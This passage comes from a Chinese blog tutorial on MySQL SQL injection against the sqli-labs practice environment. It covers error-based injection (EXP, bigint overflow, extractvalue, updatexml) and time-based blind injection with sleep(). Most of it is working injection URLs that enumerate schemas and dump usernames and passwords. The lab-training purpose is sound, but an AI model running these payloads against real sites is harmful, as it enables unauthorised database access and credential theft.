+<p><img src="/images/sqlall/bool21.jpg" alt="bool21"></p>
+<p>如果列数量不对时会报错;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-1-爆库"><a href="#2-2-1-爆库" class="headerlink" title="2.2.1.爆库"></a>2.2.1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个数据库:</span><br><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT schema_name from</span></span><br><span class="line"><span class="string">information_schema.schemata limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool23.jpg" alt="bool23"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第二个数据库:</span><br><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT schema_name from</span></span><br><span class="line"><span class="string">information_schema.schemata limit 1,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-2-爆表"><a href="#2-2-2-爆表" class="headerlink" title="2.2.2.爆表"></a>2.2.2.爆表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一张表:</span><br><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT table_name from</span></span><br><span class="line"><span class="string">information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool24.jpg" alt="bool24"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第三张表:</span><br><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT table_name from</span></span><br><span class="line"><span class="string">information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 2,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-3-爆字段"><a href="#2-2-3-爆字段" class="headerlink" title="2.2.3.爆字段"></a>2.2.3.爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个字段名:</span><br><span class="line">http://sqli-labs.me:8888/Less-5/?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT column_name from</span></span><br><span class="line"><span class="string">information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)a))),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-4-爆数据"><a href="#2-2-4-爆数据" class="headerlink" title="2.2.4.爆数据"></a>2.2.4.爆数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一列数据:注意：这里只是爆出username列;</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (exp(~(select * FROM(SELECT username from security.users limit</span></span><br><span class="line"><span class="string">0,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool26.jpg" alt="bool26"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (exp(~(select * FROM(SELECT username from security.users limit</span></span><br><span class="line"><span class="string">1,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-5-爆两列数据"><a href="#2-2-5-爆两列数据" class="headerlink" title="2.2.5.爆两列数据"></a>2.2.5.爆两列数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (exp(~(select * FROM(SELECT distinct</span></span><br><span class="line"><span class="string">concat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool27.jpg" alt="bool27"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (exp(~(select * FROM(SELECT distinct</span></span><br><span class="line"><span class="string">concat(0x3a,username,0x3a,password) from security.users limit 1,1)a))),2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-bigint溢出"><a href="#2-3-bigint溢出" class="headerlink" title="2.3.bigint溢出"></a>2.3.bigint溢出</h2><p>具体产生原理可以阅读《mysql注入之bigint溢出报错注入》其中已经介绍完备;</p>
+<h3 id="2-3-1-爆库"><a href="#2-3-1-爆库" class="headerlink" title="2.3.1.爆库"></a>2.3.1.爆库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select schema_name from</span></span><br><span class="line"><span class="string">information_schema.schemata limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool29.jpg" alt="bool29"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select schema_name from</span></span><br><span class="line"><span class="string">information_schema.schemata limit 6,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-2-爆表"><a href="#2-3-2-爆表" class="headerlink" title="2.3.2.爆表"></a>2.3.2.爆表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select table_name from information_schema.tables</span></span><br><span class="line"><span class="string">where table_schema=&#x27;security&#x27; limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool30.jpg" alt="bool30"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select table_name from information_schema.tables</span></span><br><span class="line"><span class="string">where table_schema=&#x27;security&#x27; limit 1,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-3-爆字段"><a href="#2-3-3-爆字段" class="headerlink" title="2.3.3.爆字段"></a>2.3.3.爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select column_name from information_schema.columns</span></span><br><span class="line"><span class="string">where table_name=&#x27;users&#x27; limit 0,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool31.jpg" alt="bool31"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select column_name from information_schema.columns</span></span><br><span class="line"><span class="string">where table_name=&#x27;users&#x27; limit 1,1)x) - ~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-4-爆数据"><a href="#2-3-4-爆数据" class="headerlink" title="2.3.4.爆数据"></a>2.3.4.爆数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select username from security.users limit 0,1)x) -</span></span><br><span class="line"><span class="string">~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool32.jpg" alt="bool32"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; union select (!(select * from (select username from security.users limit 1,1)x) -</span></span><br><span class="line"><span class="string">~0),2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-4-Xpath报错注入"><a href="#2-4-Xpath报错注入" class="headerlink" title="2.4.Xpath报错注入"></a>2.4.Xpath报错注入</h2><p>主要的是extractvalue函数只要两个参数哦,updatexml是3个,所以在进行构造语句时需要注意.</p>
+<h3 id="2-4-1-Xpath注入之extractvalue"><a href="#2-4-1-Xpath注入之extractvalue" class="headerlink" title="2.4.1.Xpath注入之extractvalue()"></a>2.4.1.Xpath注入之extractvalue()</h3><p>mysql&gt; select extractvalue(1,concat(0x7e,(select database()),0x7e));</p>
+<h4 id="2-4-1-1-爆库"><a href="#2-4-1-1-爆库" class="headerlink" title="2.4.1.1.爆库"></a>2.4.1.1.爆库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool34.jpg" alt="bool34"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-1-2-爆表"><a href="#2-4-1-2-爆表" class="headerlink" title="2.4.1.2.爆表"></a>2.4.1.2.爆表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class="line"><span class="string">where table_schema=&#x27;security&#x27; limit 0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool36.jpg" alt="bool36"></p>
+<h4 id="2-4-1-3-爆字段"><a href="#2-4-1-3-爆字段" class="headerlink" title="2.4.1.3.爆字段"></a>2.4.1.3.爆字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and extractvalue(1,concat(0x7e,(select column_name from</span></span><br><span class="line"><span class="string">information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool37.jpg" alt="bool37"></p>
+<h4 id="2-4-1-6-爆数据"><a href="#2-4-1-6-爆数据" class="headerlink" title="2.4.1.6.爆数据"></a>2.4.1.6.爆数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and extractvalue(1,concat(0x7e,(select username from security.users limit</span></span><br><span class="line"><span class="string">0,1),0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool38.jpg" alt="bool38"></p>
+<h3 id="2-4-2-Xpath注入之updatexml"><a href="#2-4-2-Xpath注入之updatexml" class="headerlink" title="2.4.2.Xpath注入之updatexml()"></a>2.4.2.Xpath注入之updatexml()</h3><h4 id="2-4-2-1-爆库"><a href="#2-4-2-1-爆库" class="headerlink" title="2.4.2.1.爆库"></a>2.4.2.1.爆库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool40.jpg" alt="bool40"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-2-3-爆表"><a href="#2-4-2-3-爆表" class="headerlink" title="2.4.2.3.爆表"></a>2.4.2.3.爆表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class="line"><span class="string">where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool41.jpg" alt="bool41"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables</span></span><br><span class="line"><span class="string">where table_schema=&#x27;security&#x27; limit 1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-2-4-爆字段"><a href="#2-4-2-4-爆字段" class="headerlink" title="2.4.2.4.爆字段"></a>2.4.2.4.爆字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns</span></span><br><span class="line"><span class="string">where table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool42.jpg" alt="bool42"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns</span></span><br><span class="line"><span class="string">where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-4-2-5-爆数据"><a href="#2-4-2-5-爆数据" class="headerlink" title="2.4.2.5.爆数据"></a>2.4.2.5.爆数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select username from security.users limit</span></span><br><span class="line"><span class="string">0,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool43.jpg" alt="bool43"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-6/?id=1<span class="string">&quot; and updatexml(1,concat(0x7e,(select username from security.users limit </span></span><br><span class="line"><span class="string">1,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="三、时间盲注"><a href="#三、时间盲注" class="headerlink" title="三、时间盲注"></a>三、时间盲注</h1><p>时间盲注会称为延时注入,利用页面反回结果所用时间来判断注入是否存在和后期注入进行;<br>延时注入是主要针对页面请求时间变化,无法用布尔真假判断、无法报错的情况下的注入技术.<br>延时注入作为最精准的注入,但是缺点明显——耗时长要想利用延时注.<br>延迟注入常见函数：<br>sleep() //延时<br>if(condition,true,false) //条件语句<br>ascii()=ascii码 //转换成ascii码<br>substr(“string”,strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.<br>原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示</p>
+<p><img src="/images/sqlall/bool45.jpg" alt="bool45"></p>
+<p>解析：<br>0、mysql&gt; select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);<br>1、select schema_name from information_schema.schemata limit 0,1 //取出数据库中第一个数据库,<br>2、substr(‘string’,1,1) //取出字符串,从第一个字符开始,长度为1,也就是第一个字母/字符<br>3、ascii(substr())=ascii码 //对字母/字符进行ascii编码并比较;<br>4、if(step1,1,sleep(5)) //如果第一个ascii编码的条件正确,会执行sleep()出现延时几秒,如果条件错误,则会在结果中输出1,可以看到上图的执行结果;<br>总结:可以再结合报错注入去猜解服务中数据库、表等信息;当然，延时注入也有不足之处太麻烦,但是较为准确基本能够确定字符;</p>
+<h2 id="3-1-时间盲注实战"><a href="#3-1-时间盲注实战" class="headerlink" title="3.1.时间盲注实战"></a>3.1.时间盲注实战</h2><p>这里采用Sqli-Labs中Less-10的实验来实战测试,为了更能体现出效果所以在延迟注入时,浏览器出现加载信息时出现延迟加载现象,或可以使用Burpsuite工具.</p>
+<h3 id="3-1-1-访问Less-10"><a href="#3-1-1-访问Less-10" class="headerlink" title="3.1.1.访问Less-10"></a>3.1.1.访问Less-10</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http://sqli-labs.me:8888/Less-10/?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool46.jpg" alt="bool46"></p>
+<h4 id="3-1-2-尝试双引号测试注入"><a href="#3-1-2-尝试双引号测试注入" class="headerlink" title="3.1.2.尝试双引号测试注入"></a>3.1.2.尝试双引号测试注入</h4><p>URL:浏览器出现延时,注意网络稳定性,不然会出现混淆;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs.me:8888/Less-10/?id=1<span class="string">&quot; and sleep(5)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool47.jpg" alt="bool47"></p>
+<h4 id="3-1-3-爆库"><a href="#3-1-3-爆库" class="headerlink" title="3.1.3.爆库"></a>3.1.3.爆库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：115—&gt;s</span><br><span class="line">http://sqli-labs.me:8888/Less-10/?id=1<span class="string">&quot; and if(ord(mid(database(),1,1))=115,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool48.jpg" alt="bool48"></p>
+<h4 id="3-1-5-爆表"><a href="#3-1-5-爆表" class="headerlink" title="3.1.5.爆表"></a>3.1.5.爆表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：101—&gt;e</span><br><span class="line">http://sqli-labs.me:8888/Less-10/?id=1<span class="string">&quot; and if(ord(mid((select table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool50.jpg" alt="bool50"></p>
+<h4 id="3-1-6-爆字段"><a href="#3-1-6-爆字段" class="headerlink" title="3.1.6.爆字段"></a>3.1.6.爆字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：105—&gt;i</span><br><span class="line">http://sqli-labs.me:8888/Less-10/?id=1<span class="string">&quot; and if(ord(mid((select column_name from information_schema.columns where</span></span><br><span class="line"><span class="string">table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool51.jpg" alt="bool51"></p>
+<h4 id="3-1-7-爆数据"><a href="#3-1-7-爆数据" class="headerlink" title="3.1.7.爆数据"></a>3.1.7.爆数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URl:68—&gt;D</span><br><span class="line">http://sqli-labs.me:8888/Less-10/?id=1<span class="string">&quot; and if(ord(mid((select username from security.users limit</span></span><br><span class="line"><span class="string">0,1),1,1))=68,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqlall/bool52.jpg" alt="bool52"></p>
+<p>其他字段信息请自行搭建环境测试,</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#注入" >
+    <span class="tag-code">注入</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/03/05/hello-world/">
+        <span class="nav-arrow">← </span>
+        
+          Hello World
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/03/08/Mysql%E6%B3%A8%E5%85%A5%E4%B9%8BEXP%E6%8A%A5%E9%94%99/">
+        
+          Mysql注入之EXP报错
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E4%B8%80%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">一、布尔盲注</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-1-left"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">1.1.left()</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-1-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">1.1.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-1-2-%E7%88%86%E5%BA%93"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">1.1.2.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-1-3-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">1.1.3.</span> <span class="toc-nav-text">1.1.3.爆表</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-1-4-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">1.1.4.</span> <span class="toc-nav-text">1.1.4.爆数据</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-2-ascii-amp-substr"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">1.2.ascii()&amp;substr()</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-2-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1.2.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-2-2-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">1.2.2.爆表</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-2-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">1.2.3.</span> <span class="toc-nav-text">1.2.3.爆字段</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-3-ord-amp-mid"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">1.3.ord()&amp;mid()</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-3-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">1.3.1.爆库</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-4-regexp%E6%AD%A3%E5%88%99"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">1.4.regexp正则</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-4-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">1.4.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-4-2-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">1.4.2.爆表</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-4-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">1.4.3.</span> <span class="toc-nav-text">1.4.3.爆字段</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">二、报错注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-1-count-amp-floor-amp-group-by"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">2.1.count&amp;floor&amp;group by</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-1-0-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-nav-number">2.1.1.</span> <span class="toc-nav-text">2.1.0.数据库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-1-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">2.1.2.</span> <span class="toc-nav-text">2.1.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-1-2-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">2.1.3.</span> <span class="toc-nav-text">2.1.2.爆表</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-1-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">2.1.4.</span> <span class="toc-nav-text">2.1.3.爆字段</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" 